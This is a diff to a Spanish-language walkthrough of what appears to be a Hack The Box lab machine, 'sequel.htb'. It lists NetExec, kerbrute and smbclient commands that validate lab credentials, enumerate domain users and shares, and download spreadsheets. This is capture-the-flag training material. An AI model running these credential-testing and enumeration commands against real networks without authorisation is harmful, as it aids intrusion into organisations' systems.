@@ -32,7 +32,6 @@ nxc smb 10.129.232.128
 Añadimos al `/etc/hosts` la IP y el dominio `10.129.232.128  sequel.htb dc01 dc01.sequel.htb`
 
 ### Verificamos si el usuario es valido
-
 Con el usuario que nos han proporcionado validamos si este es valido usando [[CRACKMAPEXEC]]
 ```shell
 nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su'
@@ -41,46 +40,45 @@ nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su'
 Verificamos que si que son validas las credenciales
 
 ### Enumeración de usuarios existentes
-Con las credenciales validas enumeramos usuarios existentes obteniendo asi una lsita de usuarios
+Con las credenciales validas enumeramos usuarios existentes obteniendo así una lista de usuarios
 ```shell
 nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --rid-brute  | grep "SidTypeUser" | awk '{print $6}' | cut -d '\' -f2-2 | tee users.txt
 ```
 
 ### Enumeración de usuarios validos
-
-
+Con [[KERBRUTE]] enumeramos cual de los usuarios que hemos obtenido anteriormente son realmente validos
 ```shell
 kerbrute userenum --dc 10.129.232.128 -d sequel.htb users.txt
 ```
 
 ### Enumeramos los recursos compartidos en red
-
+Con [[CRACKMAPEXEC]] enumeramos los recursos compartidos a los que el usuario `rose` tiene acceso
 ```shell
 nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --shares
 ```
 
+Vemos que hay un recurso compartido llamado `Accounting Department`
 ```shell
-Share           Permissions     Remark
------           -----------     ------
-Accounting Department READ            
-ADMIN$                          Remote Admin
-C$                              Default share
-IPC$            READ            Remote IPC
-NETLOGON        READ            Logon server share 
-SYSVOL          READ            Logon server share 
-Users           READ            
+Share                          Permissions     Remark
+-----                          -----------     ------
+Accounting Department          READ            
+ADMIN$                                         Remote Admin
+C$                                             Default share
+IPC$                           READ            Remote IPC
+NETLOGON                       READ            Logon server share 
+SYSVOL                         READ            Logon server share 
+Users                          READ            
 ```
 
-Accedemos a `Accounting Department`
+Accedemos a `Accounting Department` usando [[SMBCLIENT]] con el usuario valido
 ```shell
 smbclient //10.129.232.128/"Accounting Department" -U 'rose%KxEPkKe6R8su'
 ```
 
-Nos traemos dos ficheros excel que vemos
+Encontramos dos archivos excel, y nos los traemos a nuestra maquina
 ```shell
 get accounting_2024.xlsx
 ```
-
 ```shell
 get accounts.xlsx
 ```
